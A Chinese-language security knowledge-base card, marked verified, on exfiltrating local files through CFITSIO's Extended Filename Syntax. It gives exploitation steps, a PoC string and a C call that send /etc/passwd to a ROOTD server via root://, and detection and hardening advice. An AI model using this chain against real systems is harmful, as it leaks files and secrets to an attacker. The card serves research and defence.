---
id: web-generic-cfitsio-efs-root-driver-local-file-exfiltration
title: CFITSIO EFS root:// 输出驱动配合 Raw Data 子句外传本地文件
type: scenario
domain: web
path: web/generic
technique: cfitsio-efs-root-driver-file-exfiltration
tags:
- web
- file-processing
- cfitsio
- fits
- efs
- rootd
- exfiltration
- raw-data
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:37+08:00'
  notes: 已对照原文与截图核对：/etc/passwd 加 root 驱动与 b500,1 子句、ROOTD_OPEN/ROOTD_PUT 2880+2880、BITPIX=8/NAXIS1=500 及数据块含 passwd 内容均一致。未验证点：未复跑；需进程可出网到攻击者 ROOTD。
url: /docs/web/generic/web-generic-cfitsio-efs-root-driver-local-file-exfiltration/
draft: false
kb_aliases:
- CFITSIO 文件外传
- EFS root:// 外传
- Raw Data Clause 文件外带
- ROOTD_PUT 外传
- '[b500,1] 转换外传'
---

## 一句话结论

当 CFITSIO 处理用户可控的 EFS 字符串时，`本地文件(root://攻击者//路径)[bN,1][*,*]` 会先把普通文件字节重新解释为 `BITPIX=8` 的合法 FITS 图像，再由 `root://` Driver 通过 `ROOTD_OPEN`/`ROOTD_PUT` 写入远程服务，形成完整的本地文件外传链。

## 原理

- EFS 的 outfile 可以是本地路径，也可以是协议 URL。HTTP Driver 明确拒绝 READWRITE，但 ROOTD 协议定义了远程创建、写入、刷新和关闭操作，`ROOTD_PUT` 会携带偏移、长度和原始数据，因此可以承担输出端。
- 普通文本（如 `/etc/passwd`）不是 FITS 文件，直接作为输入会在 Header 校验阶段失败，无法进入后续输出流程。
- Raw Data Clause `[bN,1]` 把输入的前 N 个字节按 8 位字节解释为 `BITPIX=8`、`NAXIS=2`、`NAXIS1=N`、`NAXIS2=1` 的二维图像；`[*,*]` 选择全部数据。转换后的对象具有合法 FITS Header，可以继续走输出链路。
- 于是三个正常能力被组合：本地文件 Driver 提供读取、Raw Data Clause 提供“对象合法化”、ROOTD Driver 提供远程写入。FITS 以 2880 字节为逻辑记录块，`ROOTD_PUT` 第一块是动态生成的 Header，第二块包含文件内容和补齐字节。
- 该链不绕过操作系统权限：只能读取 CFITSIO 进程有权限读取的文件，且需要进程能主动连接攻击者 ROOTD 服务。

## 触发条件

- EFS 开启，且攻击者可控制传入 `fits_open_file()` 的完整字符串（包括 outfile 协议与 Raw Data Clause）。
- CFITSIO 进程对目标本地文件有读权限。
- 进程可出网访问攻击者控制的 ROOTD 服务（默认端口 1094），且构建包含 ROOTD Driver。
- 实验环境为 CFITSIO 4.6.3；原文未给出明确的受影响版本区间。

## 利用步骤

1. 在攻击者主机启动最小 ROOTD 服务，记录 `ROOTD_OPEN`、`ROOTD_PUT`、`ROOTD_FLUSH`、`ROOTD_CLOSE`。
2. 构造 EFS：`<本地文件>(root://<攻击者>:1094//<远程对象名>)[b<N>,1][*,*]`。
3. 让应用把该字符串交给 `fits_open_file()`；CFITSIO 读取本地文件前 N 字节并包装成 FITS 图像。
4. ROOTD 服务端收到对象创建请求，随后收到 Header 块与数据块。
5. 从 `ROOTD_PUT` 的第二个数据块中提取原始文件内容；根据 2880 字节补齐规则去掉尾部填充。

## PoC

```text
/etc/passwd(root://127.0.0.1:1094//capture)[b500,1][*,*]
```

```c
int status;
fitsfile *fptr;
fits_open_file(&fptr, "/etc/passwd(root://127.0.0.1:1094//capture)[b500,1][*,*]",
               READONLY, &status);
```

服务端应记录 `ROOTD_OPEN`（create）、`ROOTD_PUT`（offset=0、length=2880，FITS Header）、`ROOTD_PUT`（offset=2880，含文件内容）、`ROOTD_FLUSH`、`ROOTD_CLOSE`。Header 中的 `BITPIX=8`、`NAXIS=2`、`NAXIS1=500`、`NAXIS2=1` 与 `[b500,1]` 对应。

## 变体与关联

- 调整 `[bN,1]` 的 N 可控制单次外传字节数；大文件可结合多次请求或分块读取。
- 若 ROOTD 不可达，可评估其他可写 Driver 或把 outfile 指向本地可读目录，再通过其他通道取回，见 [[web-generic-cfitsio-efs-outfile-arbitrary-file-copy]]。
- 与 SSRF 卡片的区别：本链的终点是“把本地数据写到远程”，不是“读取远程响应”；两者可组合，见 [[web-generic-ssrf-cfitsio-efs-http-outfile-response]]。
- 关联通用思路：文件名被解释为协议/数据流描述，解析器把普通数据“合法化”后送入高权限输出通道。

## 检测与防御

- **检测（输入）**：EFS 中出现 `root://`、外部主机和端口、`[b` 开头的 Raw Data Clause、`[*,*]` 组合。
- **检测（网络）**：CFITSIO 进程主动连接 1094 或其他非预期 ROOTD 端口；出现 `ROOTD_OPEN`/`ROOTD_PUT` 流量；短时间大量 2880 字节块。
- **检测（主机）**：解析任务读取敏感文件后立即产生外连；进程行为与业务声明的输入来源不符。
- **修复**：只处理本地文件时使用 `fits_open_diskfile()`；必须使用 EFS 时，对 `urltype` 做白名单，禁止 `root://` 和外部 outfile。
- **加固**：对解析进程做 egress 限制（防火墙、Seccomp 拒绝 `connect`、AppArmor），以低权限运行；对输出路径和协议做强制类型校验，而不是只过滤字符串黑名单。
